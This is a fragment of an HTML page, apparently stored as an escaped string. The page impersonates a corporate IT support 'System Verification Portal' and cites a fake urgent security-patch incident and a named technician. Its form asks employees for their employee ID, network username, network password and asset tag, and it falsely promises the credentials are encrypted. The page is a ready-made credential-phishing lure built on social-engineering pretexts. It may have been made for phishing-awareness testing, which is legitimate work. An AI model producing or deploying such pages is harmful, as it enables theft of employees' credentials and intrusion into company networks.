4px;\n            font-size: 14px;\n            box-sizing: border-box;\n        }\n        .form-group input:focus {\n            outline: none;\n            border-color: #2c5aa0;\n        }\n        .security-note {\n            background: #fff3e0;\n            border: 1px solid #ffcc02;\n            border-radius: 6px;\n            padding: 15px;\n            margin: 20px 0;\n        }\n        .submit-btn {\n            background: #2c5aa0;\n            color: white;\n            border: none;\n            padding: 14px 28px;\n            border-radius: 4px;\n            font-size: 16px;\n            cursor: pointer;\n            width: 100%;\n            margin-top: 15px;\n        }\n        .submit-btn:hover {\n            background: #1e3f73;\n        }\n        .tech-contact {\n            background: #f5f5f5;\n            padding: 20px;\n            border-radius: 6px;\n            margin-top: 25px;\n        }\n        .tech-contact h4 {\n            margin: 0 0 10px 0;\n            color: #333;\n        }\n        .footer {\n            background: #f8f8f8;\n            padding: 20px;\n            text-align: center;\n            font-size: 12px;\n            color: #666;\n            border-top: 1px solid #e0e0e0;\n        }\n    </style>\n</head>\n<body>\n    <div class=\"container\">\n        <div class=\"header\">\n            <h1>🔧 Corporate IT Support</h1>\n            <p>System Verification Portal</p>\n        </div>\n        \n        <div class=\"content\">\n            <div class=\"incident-info\">\n                <h3>📋 Maintenance Incident Details</h3>\n                <p><strong>Incident ID:</strong> INC-2024-7829</p>\n                <p><strong>Assigned Technician:</strong> Mike Johnson (Ext. 4751)</p>\n                <p><strong>Issue Type:</strong> Critical Windows Security Patch</p>\n                <p><strong>Call Time:</strong> Today at 10:23 AM</p>\n                <p><strong>Priority:</strong> HIGH - Security Vulnerability</p>\n            </div>\n            \n            <div class=\"verification-section\">\n                <h3>🔐 Account Verification Required</h3>\n                <p>Please verify your network credentials to complete the security patch installation:</p>\n                \n                <form method=\"POST\" action=\"\">\n                    <div class=\"form-group\">\n                        <label for=\"employeeId\">Employee ID</label>\n                        <input type=\"text\" id=\"employeeId\" name=\"employeeId\" placeholder=\"Enter your employee ID\" required>\n                    </div>\n                    \n                    <div class=\"form-group\">\n                        <label for=\"networkUsername\">Network Username</label>\n                        <input type=\"text\" id=\"networkUsername\" name=\"networkUsername\" placeholder=\"DOMAIN\\username\" required>\n                    </div>\n                    \n                    <div class=\"form-group\">\n                        <label for=\"networkPassword\">Network Password</label>\n                        <input type=\"password\" id=\"networkPassword\" name=\"networkPassword\" placeholder=\"Password\" required>\n                    </div>\n                    \n                    <div class=\"form-group\">\n                        <label for=\"computerName\">Computer Name/Asset Tag</label>\n                        <input type=\"text\" id=\"computerName\" name=\"computerName\" placeholder=\"e.g., CORP-LAPTOP-001\" required>\n                    </div>\n                    \n                    <div class=\"security-note\">\n                        <strong>⚠️ Security Notice:</strong> This verification is required to ensure the security patch is applied to the correct system. Your credentials are encrypted and processed securely.\n                    </div>\n                    \n                    <button type=\"submit\" class=\"submit-btn\">Verify Account & Apply Patch</button>\n                </form>\n            </div>\n            \n            <div class=\"tech-contact\">\n                <h4>👨‍💻 Technical Contact Information</h4>\n                <p><strong>Technician:</strong> Mike Johnson</p>\n                <p><strong>Extension:</strong> 4751</p>\n                <p><strong>Email:</strong> mike.johnson@corp-it.local</p>\n                <p><strong>Department:</strong> IT Security & Infrastructure</p>\n            </div>\n        </div>\n        \n        <div class=\"footer\">\n            <p>Corporate IT Department | Internal Systems Only</p>\n            <p>For technical support, call Help Desk at Ext. 4751</p>\n        </div>\n    </div>\n</body>\n</html>",
